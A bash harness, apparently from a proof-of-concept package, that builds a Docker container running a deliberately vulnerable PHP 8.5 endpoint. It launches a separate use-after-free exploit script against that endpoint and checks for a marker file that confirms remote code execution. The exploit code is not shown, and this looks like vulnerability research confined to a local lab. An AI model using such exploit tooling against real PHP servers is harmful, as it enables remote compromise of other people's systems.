#!/usr/bin/env bash
#
# Build and run the remote PoC in Docker.
#
# Spins up php:8.5-apache with the vulnerable remote_app.php endpoint and
# runs php8_remote.py against it. The chain takes ~2,150 HTTP requests.

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
IMAGE="${IMAGE:-php-uaf-poc}"
CONTAINER="${CONTAINER:-php-uaf-poc}"
HOST_PORT="${HOST_PORT:-8081}"
# Verified end-to-end on both linux/amd64 and linux/arm64. Default to the
# host's native platform; override with e.g. PLATFORM=linux/amd64.
PLATFORM="${PLATFORM:-}"
dbuild() { docker build ${PLATFORM:+--platform "${PLATFORM}"} -t "${IMAGE}" "${HERE}"; }
drun()   { docker run -d ${PLATFORM:+--platform "${PLATFORM}"} --name "${CONTAINER}" -p "${HOST_PORT}:80" "${IMAGE}"; }

case "${1:-run}" in
    build)
        dbuild
        ;;
    run)
        docker image inspect "${IMAGE}" >/dev/null 2>&1 || dbuild
        docker rm -f "${CONTAINER}" 2>/dev/null || true
        drun
        echo "[*] Container up; endpoint: http://127.0.0.1:${HOST_PORT}/remote_app.php"
        sleep 2
        echo
        docker exec "${CONTAINER}" rm -f /dev/shm/x 2>/dev/null || true
        python3 "${HERE}/php8_remote.py" --host 127.0.0.1 --port "${HOST_PORT}" || true
        echo
        echo "[*] Verifying inside container:"
        if docker exec "${CONTAINER}" test -f /dev/shm/x; then
            echo "============================================================"
            echo "  RCE SUCCESS: /dev/shm/x in ${CONTAINER}"
            docker exec "${CONTAINER}" cat /dev/shm/x | sed 's/^/    /'
            echo "============================================================"
        else
            echo "[-] /dev/shm/x not found in container; RCE did not land"
            exit 1
        fi
        ;;
    stop)
        docker rm -f "${CONTAINER}" 2>/dev/null || true
        ;;
    clean)
        docker rm -f "${CONTAINER}" 2>/dev/null || true
        docker image rm -f "${IMAGE}" 2>/dev/null || true
        ;;
    *)
        cat <<EOF
Usage: $0 [build|run|stop|clean]

  build  Build the Docker image (php:8.5-apache + vulnerable endpoint)
  run    Build if needed, start container, run exploit (default)
  stop   Stop and remove the container
  clean  Remove container and image

Environment:
  IMAGE       Docker image tag (default: ${IMAGE})
  CONTAINER   Container name (default: ${CONTAINER})
  HOST_PORT   Host port to publish (default: ${HOST_PORT})
  PLATFORM    Docker platform (default: native; e.g. linux/amd64, linux/arm64)
EOF
        exit 2
        ;;
esac
